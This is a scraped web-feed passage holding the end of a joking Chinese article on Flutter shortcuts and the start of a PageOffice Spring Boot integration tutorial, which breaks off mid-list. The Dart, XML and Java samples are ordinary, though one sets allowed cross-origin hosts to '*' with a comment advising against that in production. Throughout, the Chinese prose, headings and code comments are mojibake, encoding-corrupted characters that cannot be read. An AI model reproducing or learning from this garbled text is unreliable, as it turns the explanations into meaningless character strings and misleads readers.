    <span class="hljs-keyword">final</span> progressRect = Rect.fromLTWH(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, size.width * progress, size.height);
    <span class="hljs-keyword">final</span> progressRRect = RRect.fromRectAndRadius(progressRect, Radius.circular(<span class="hljs-number">10</span>));

    <span class="hljs-keyword">final</span> gradient = LinearGradient(colors: colors);
    <span class="hljs-keyword">final</span> progressPaint = Paint()
      ..shader = gradient.createShader(progressRect);

    canvas.drawRRect(progressRRect, progressPaint);

    <span class="hljs-comment">// é«˜å…‰æ•ˆæœ</span>
    <span class="hljs-keyword">final</span> highlightPaint = Paint()
      ..color = Colors.white.withOpacity(<span class="hljs-number">0.3</span>)
      ..style = PaintingStyle.stroke
      ..strokeWidth = <span class="hljs-number">2</span>;
    canvas.drawRRect(progressRRect, highlightPaint);
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">bool</span> shouldRepaint(<span class="hljs-keyword">covariant</span> _FancyProgressPainter oldDelegate) {
    <span class="hljs-keyword">return</span> oldDelegate.progress != progress;
  }
}
</code></pre>
<h3 data-id="heading-16">4.3 Stack + Positionedï¼šå¸ƒå±€ä¸‡é‡‘æ²¹</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬å…«å¼ï¼šStack è§£å†³ä¸€åˆ‡å¸ƒå±€é—®é¢˜</span>

<span class="hljs-comment">// å½“ä½ ä¸çŸ¥é“æ€ä¹ˆå¸ƒå±€çš„æ—¶å€™ï¼ŒStack ä¸€æŠŠæ¢­</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ComplexLayout</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Stack(
      children: [
        <span class="hljs-comment">// èƒŒæ™¯</span>
        Positioned.fill(
          child: Image.asset(<span class="hljs-string">'bg.png'</span>, fit: BoxFit.cover),
        ),

        <span class="hljs-comment">// æ¨¡ç³Šé®ç½©</span>
        Positioned.fill(
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: <span class="hljs-number">10</span>, sigmaY: <span class="hljs-number">10</span>),
            child: Container(color: Colors.black.withOpacity(<span class="hljs-number">0.3</span>)),
          ),
        ),

        <span class="hljs-comment">// å†…å®¹</span>
        Positioned(
          left: <span class="hljs-number">20</span>,
          right: <span class="hljs-number">20</span>,
          bottom: <span class="hljs-number">100</span>,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(<span class="hljs-string">'æ ‡é¢˜'</span>, style: TextStyle(color: Colors.white, fontSize: <span class="hljs-number">24</span>)),
              Text(<span class="hljs-string">'å‰¯æ ‡é¢˜'</span>, style: TextStyle(color: Colors.white70)),
            ],
          ),
        ),

        <span class="hljs-comment">// å³ä¸Šè§’æ ‡ç­¾</span>
        Positioned(
          top: <span class="hljs-number">20</span>,
          right: <span class="hljs-number">20</span>,
          child: Container(
            padding: EdgeInsets.symmetric(horizontal: <span class="hljs-number">12</span>, vertical: <span class="hljs-number">6</span>),
            decoration: BoxDecoration(
              color: Colors.red,
              borderRadius: BorderRadius.circular(<span class="hljs-number">20</span>),
            ),
            child: Text(<span class="hljs-string">'HOT'</span>, style: TextStyle(color: Colors.white)),
          ),
        ),

        <span class="hljs-comment">// åº•éƒ¨æŒ‰é’®</span>
        Positioned(
          left: <span class="hljs-number">20</span>,
          right: <span class="hljs-number">20</span>,
          bottom: <span class="hljs-number">40</span>,
          child: ElevatedButton(
            onPressed: () {},
            child: Text(<span class="hljs-string">'ç«‹å³è´­ä¹°'</span>),
          ),
        ),
      ],
    );
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-17">ç¬¬äº”ç« ï¼šè°ƒè¯•çš„é‡è·¯å­</h2>
<h3 data-id="heading-18">5.1 æ‰“å°å¤§æ³•</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬ä¹å¼ï¼šæ‰“å°ä¸€åˆ‡</span>

<span class="hljs-comment">// æ™®é€šæ‰“å°</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'debug: <span class="hljs-subst">$value</span>'</span>);

<span class="hljs-comment">// å¸¦é¢œè‰²çš„æ‰“å°ï¼ˆç»ˆç«¯æ”¯æŒï¼‰</span>
<span class="hljs-keyword">void</span> logRed(<span class="hljs-built_in">String</span> msg) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'\x1B[31m<span class="hljs-subst">$msg</span>\x1B[0m'</span>);
<span class="hljs-keyword">void</span> logGreen(<span class="hljs-built_in">String</span> msg) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'\x1B[32m<span class="hljs-subst">$msg</span>\x1B[0m'</span>);
<span class="hljs-keyword">void</span> logYellow(<span class="hljs-built_in">String</span> msg) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'\x1B[33m<span class="hljs-subst">$msg</span>\x1B[0m'</span>);
<span class="hljs-keyword">void</span> logBlue(<span class="hljs-built_in">String</span> msg) =&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">'\x1B[34m<span class="hljs-subst">$msg</span>\x1B[0m'</span>);

<span class="hljs-comment">// å¸¦æ—¶é—´æˆ³çš„æ‰“å°</span>
<span class="hljs-keyword">void</span> logWithTime(<span class="hljs-built_in">String</span> msg) {
  <span class="hljs-keyword">final</span> now = <span class="hljs-built_in">DateTime</span>.now();
  <span class="hljs-built_in">print</span>(<span class="hljs-string">'[<span class="hljs-subst">${now.hour}</span>:<span class="hljs-subst">${now.minute}</span>:<span class="hljs-subst">${now.second}</span>] <span class="hljs-subst">$msg</span>'</span>);
}

<span class="hljs-comment">// æ‰“å° Widget æ ‘</span>
<span class="hljs-keyword">void</span> debugPrintWidget(Widget widget, [<span class="hljs-built_in">int</span> indent = <span class="hljs-number">0</span>]) {
  <span class="hljs-keyword">final</span> prefix = <span class="hljs-string">'  '</span> * indent;
  <span class="hljs-built_in">print</span>(<span class="hljs-string">'<span class="hljs-subst">$prefix</span><span class="hljs-subst">${widget.runtimeType}</span>'</span>);
}

<span class="hljs-comment">// æ‰“å°è°ƒç”¨æ ˆ</span>
<span class="hljs-keyword">void</span> printStack() {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">throw</span> Exception();
  } <span class="hljs-keyword">catch</span> (e, stack) {
    <span class="hljs-built_in">print</span>(stack);
  }
}
</code></pre>
<h3 data-id="heading-19">5.2 ä¸´æ—¶ UI è°ƒè¯•</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// é‚ªä¿®ç§˜ç±ç¬¬åå¼ï¼šä¸´æ—¶è°ƒè¯• UI</span>

<span class="hljs-comment">// ç»™ä»»ä½• Widget åŠ è¾¹æ¡†ï¼Œçœ‹æ¸…æ¥šè¾¹ç•Œ</span>
<span class="hljs-keyword">extension</span> DebugExtension <span class="hljs-keyword">on</span> Widget {
  Widget <span class="hljs-keyword">get</span> debugBorder =&gt; Container(
    decoration: BoxDecoration(
      border: Border.all(color: Colors.red, width: <span class="hljs-number">1</span>),
    ),
    child: <span class="hljs-keyword">this</span>,
  );

  Widget debugColor(Color color) =&gt; ColoredBox(
    color: color.withOpacity(<span class="hljs-number">0.3</span>),
    child: <span class="hljs-keyword">this</span>,
  );
}

<span class="hljs-comment">// ä½¿ç”¨</span>
SomeWidget().debugBorder  <span class="hljs-comment">// åŠ çº¢è‰²è¾¹æ¡†</span>
SomeWidget().debugColor(Colors.blue)  <span class="hljs-comment">// åŠ è“è‰²èƒŒæ™¯</span>

<span class="hljs-comment">// ä¸´æ—¶æ˜¾ç¤ºå°ºå¯¸ä¿¡æ¯</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SizeReporter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  <span class="hljs-keyword">const</span> SizeReporter({<span class="hljs-keyword">super</span>.key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> LayoutBuilder(
      builder: (context, constraints) {
        <span class="hljs-comment">// æ‰“å°çº¦æŸä¿¡æ¯</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'Constraints: <span class="hljs-subst">$constraints</span>'</span>);
        <span class="hljs-keyword">return</span> child;
      },
    );
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-20">å†™åœ¨æœ€åï¼šé‚ªä¿®æœ‰é£é™©ï¼Œä½¿ç”¨éœ€è°¨æ…</h2>
<p>è¿™äº›æŠ€å·§ä¹‹æ‰€ä»¥å«"é‚ªä¿®"ï¼Œæ˜¯å› ä¸ºå®ƒä»¬ï¼š</p>
<ol>
<li><strong>å¯èƒ½ä¸ç¬¦åˆæœ€ä½³å®è·µ</strong> â€”â€” ä½†èƒ½è§£å†³é—®é¢˜</li>
<li><strong>å¯èƒ½è®©ä»£ç éš¾ä»¥ç»´æŠ¤</strong> â€”â€” ä½†èƒ½å¿«é€Ÿäº¤ä»˜</li>
<li><strong>å¯èƒ½è®©åŒäº‹çœ‹ä¸æ‡‚</strong> â€”â€” ä½†ä½ è‡ªå·±çˆ½å°±è¡Œ</li>
</ol>
<p>ä½¿ç”¨å»ºè®®ï¼š</p>
<ul>
<li>âœ… ä¸ªäººé¡¹ç›®ï¼šéšä¾¿ç”¨ï¼Œçˆ½å°±å®Œäº‹</li>
<li>âš ï¸ å°å›¢é˜Ÿé¡¹ç›®ï¼šå’Œé˜Ÿå‹å•†é‡å¥½å†ç”¨</li>
<li>âŒ å¤§å‹é¡¹ç›®ï¼šä¸‰æ€è€Œåè¡Œï¼Œæœ€å¥½å†™å¥½æ³¨é‡Š</li>
</ul>
<p>è®°ä½ï¼š<strong>èƒ½è·‘çš„ä»£ç å°±æ˜¯å¥½ä»£ç </strong>ï¼ˆé€ƒ</p>
<hr/>
<h2 data-id="heading-21">äº’åŠ¨è¯é¢˜</h2>
<ol>
<li>ä½ æœ‰ä»€ä¹ˆ Flutter é‚ªä¿®æŠ€å·§ï¼Ÿ</li>
<li>ä½ è¢«åµŒå¥—åœ°ç‹±æŠ˜ç£¨è¿‡å—ï¼Ÿ</li>
<li>ä½ è§‰å¾—å“ªä¸ªçŠ¶æ€ç®¡ç†æ–¹æ¡ˆæœ€å¥½ç”¨ï¼Ÿ</li>
</ol>
<p>æ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„"é‚ªä¿®"ç»éªŒï¼</p>
<hr/>
<p><em>æœ¬æ–‡ä»…ä¾›å¨±ä¹å’Œå­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ»¥ç”¨ã€‚å¦‚å› ä½¿ç”¨æœ¬æ–‡æŠ€å·§å¯¼è‡´ä»»ä½•é—®é¢˜ï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ã€‚</em></p>
<p><strong>#Flutter å¼€å‘ #ç§»åŠ¨å¼€å‘ #ç¼–ç¨‹æŠ€å·§ #Dart #è·¨å¹³å°å¼€å‘</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PageOfficeæœ€ç®€é›†æˆä»£ç (Springboot)]]></title>    <link>https://juejin.cn/post/7592582130595102771</link>    <guid>https://juejin.cn/post/7592582130595102771</guid>    <pubDate>2026-01-08T05:53:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592582130595102771" data-draft-id="7592582130595037235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PageOfficeæœ€ç®€é›†æˆä»£ç (Springboot)"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T05:53:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·69561944037"/> <meta itemprop="url" content="https://juejin.cn/user/3739869818388507"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PageOfficeæœ€ç®€é›†æˆä»£ç (Springboot)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3739869818388507/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·69561944037
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T05:53:20.000Z" title="Thu Jan 08 2026 05:53:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡æè¿°äº†PageOfficeäº§å“åœ¨Springbooté¡¹ç›®ä¸­å¦‚ä½•é›†æˆè°ƒç”¨ã€‚ï¼ˆæœ¬ç¤ºä¾‹ä½¿ç”¨äº†Thymeleafæ¨¡æ¿å¼•æ“ï¼‰</p>
<ol>
<li>
<p>æ–°å»ºSpringbooté¡¹ç›®ï¼špageoffice6-springboot2-simple</p>
</li>
<li>
<p>åœ¨æ‚¨é¡¹ç›®çš„pom.xmlä¸­é€šè¿‡ä¸‹é¢çš„ä»£ç å¼•å…¥PageOfficeä¾èµ–ã€‚pageoffice.jarå·²å‘å¸ƒåˆ°<a href="https://link.juejin.cn?target=https%3A%2F%2Fmvnrepository.com%2Fartifact%2Fcom.zhuozhengsoft%2Fpageoffice" target="_blank" title="https://mvnrepository.com/artifact/com.zhuozhengsoft/pageoffice" ref="nofollow noopener noreferrer">Mavenä¸­å¤®ä»“åº“Â (opens new window)</a>ï¼Œå»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ã€‚</p>
<p>å¦‚æœä½¿ç”¨Springboot3ï¼Œæˆ–Tomcat10åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œä½¿ç”¨ä¸‹é¢çš„pom.xmlé…ç½®</p>
</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zhuozhengsoft<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>   
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pageoffice<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>   
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.6.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>å¦‚æœä½¿ç”¨Springboot2ï¼Œæˆ–Tomcat9åŠä»¥ä¸‹çš„ç‰ˆæœ¬ï¼Œä½¿ç”¨ä¸‹é¢çš„pom.xmlé…ç½®</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zhuozhengsoft<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>   
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>pageoffice<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>   
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.6.1.1-javax<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<ol start="3">
<li>
<p>æ–°å»ºä¸€ä¸ªpageofficeæ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾PageOfficeçš„ç³»ç»Ÿæ–‡ä»¶ï¼ˆå¦‚license.licã€å®¢æˆ·ç«¯å®‰è£…åŒ…ç­‰ï¼‰ï¼Œæ¯”å¦‚windowsç¯å¢ƒä¸‹åˆ›å»ºï¼šD:/pageofficeï¼Œlinuxç¯å¢ƒä¸‹åˆ›å»º:/root/pageoffice</p>
</li>
<li>
<p>æ‹·è´pageofficeå®¢æˆ·ç«¯å®‰è£…ç¨‹åºåˆ°ä¸Šä¸€æ­¥åˆ›å»ºçš„pageofficeæ–‡ä»¶å¤¹ä¸‹ã€‚</p>
<ul>
<li>å®¢æˆ·ç«¯æ˜¯windowsç¯å¢ƒï¼šæ‹·è´posetup_6.6.1.1.exeåˆ°pageofficeæ–‡ä»¶å¤¹ä¸‹ï¼›</li>
<li>å®¢æˆ·ç«¯æ˜¯å›½äº§æ“ä½œç³»ç»Ÿç¯å¢ƒï¼šæ‹·è´å¯¹åº”èŠ¯ç‰‡çš„PageOfficeå®¢æˆ·ç«¯debå®‰è£…åŒ…åˆ°pageofficeæ–‡ä»¶å¤¹ä¸‹ï¼›</li>
</ul>
</li>
</ol>
<blockquote>
<p>PageOfficeå®¢æˆ·ç«¯å®‰è£…ç¨‹åºä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.zhuozhengsoft.com%2Fdowm%2F" target="_blank" title="https://www.zhuozhengsoft.com/dowm/" ref="nofollow noopener noreferrer">www.zhuozhengsoft.com/dowm/(opensâ€¦</a></p>
</blockquote>
<ol start="5">
<li>æ‰“å¼€springbooté¡¹ç›®çš„é…ç½®æ–‡ä»¶application.propertiesï¼Œæ·»åŠ ä¸€ä¸ªposyspathå˜é‡ï¼Œå€¼ä¸ºä¸Šä¸€æ­¥åˆ›å»ºçš„pageofficeæ–‡ä»¶å¤¹çš„è·¯å¾„</li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">posyspath</span>=D:/page<span class="hljs-literal">off</span>ice
</code></pre>
<ol start="6">
<li>åœ¨æ‚¨é¡¹ç›®çš„å¯åŠ¨ç±»Applicationç±»ä¸­æ·»åŠ ä¸€é¡¹@Beané…ç½®ï¼Œæ­¤ä¸ºPageOfficeæœåŠ¡å™¨ç«¯çš„å¿…è¦é…ç½®ï¼Œä»£ç å¦‚ä¸‹ï¼š</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Value</span>(<span class="hljs-string">"${posyspath}"</span>)
<span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> poSysPath;

<span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">ServletRegistrationBean</span> <span class="hljs-title function_">pageofficeRegistrationBean</span>(<span class="hljs-params"/>)  {
  com.<span class="hljs-property">zhuozhengsoft</span>.<span class="hljs-property">pageoffice</span>.<span class="hljs-property">poserver</span>.<span class="hljs-property">Server</span> poserver 
      						= <span class="hljs-keyword">new</span> com.<span class="hljs-property">zhuozhengsoft</span>.<span class="hljs-property">pageoffice</span>.<span class="hljs-property">poserver</span>.<span class="hljs-title class_">Server</span>();
  poserver.<span class="hljs-title function_">setSysPath</span>(poSysPath);<span class="hljs-comment">//è®¾ç½®PageOfficeæ³¨å†ŒæˆåŠŸå,license.licæ–‡ä»¶å­˜æ”¾çš„ç›®å½•</span>
    
  <span class="hljs-title class_">ServletRegistrationBean</span> srb = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRegistrationBean</span>(poserver);
  srb.<span class="hljs-title function_">addUrlMappings</span>(<span class="hljs-string">"/poserver.zz"</span>);
  srb.<span class="hljs-title function_">addUrlMappings</span>(<span class="hljs-string">"/poclient"</span>);
  srb.<span class="hljs-title function_">addUrlMappings</span>(<span class="hljs-string">"/pageoffice.js"</span>);
  srb.<span class="hljs-title function_">addUrlMappings</span>(<span class="hljs-string">"/sealsetup.exe"</span>);
  <span class="hljs-keyword">return</span> srb;
}

<span class="hljs-comment">// PageOffice V6.6åŠä»¥ä¸Šç‰ˆæœ¬æ–°å¢ä»¥ä¸‹ä»£ç ï¼ŒV6.5åŠä¹‹å‰ç‰ˆæœ¬æ— éœ€æ­¤ä»£ç </span>
<span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">ServerEndpointExporter</span> <span class="hljs-title function_">serverEndpointExporter</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">ServerEndpointExporter</span> exporter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerEndpointExporter</span>();
    exporter.<span class="hljs-title function_">setAnnotatedEndpointClasses</span>(
            com.<span class="hljs-property">zhuozhengsoft</span>.<span class="hljs-property">pageoffice</span>.<span class="hljs-property">poserver</span>.<span class="hljs-property">WServer</span>.<span class="hljs-property">class</span>
    );
    <span class="hljs-keyword">return</span> exporter;
}
<span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">ServletListenerRegistrationBean</span> <span class="hljs-title function_">powContextListener</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletListenerRegistrationBean</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">POWContextListener</span>());
}
<span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">ServletContextInitializer</span> <span class="hljs-title function_">pageofficeContextParams</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">/*
         * powserverè·¨åŸŸå®‰å…¨é…ç½®ï¼š
         * 1. ç”Ÿäº§ç¯å¢ƒä¸æ¨èä½¿ç”¨"*"ï¼Œå»ºè®®æ˜ç¡®æŒ‡å®šå…è®¸çš„åŸŸå/IP
         * 2. æ ¼å¼ï¼šå¤šä¸ªåœ°å€ç”¨é€—å·åˆ†éš”ï¼Œå¦‚"åŸŸå1,åŸŸå2,IP"ã€‚æ³¨æ„ï¼šæœ¬åœ°å¼€å‘ç¯å¢ƒåœ°å€(localhost,127.0.0.1)ä¹Ÿå¿…é¡»åœ¨æ­¤é…ç½®
         * 3. ç¤ºä¾‹:
         *    - å•ä½“å¤šå…¥å£ï¼š"åŸŸå,ip"
         *      (å¦‚"www.oa.com,192.168.1.100")
         */</span>
    <span class="hljs-keyword">return</span> servletContext -&gt;
        servletContext.<span class="hljs-title function_">setInitParameter</span>(<span class="hljs-string">"powserver-allowedOrigins"</span>, <span class="hljs-string">"*"</span>);
}
</code></pre>
<ol start="7">
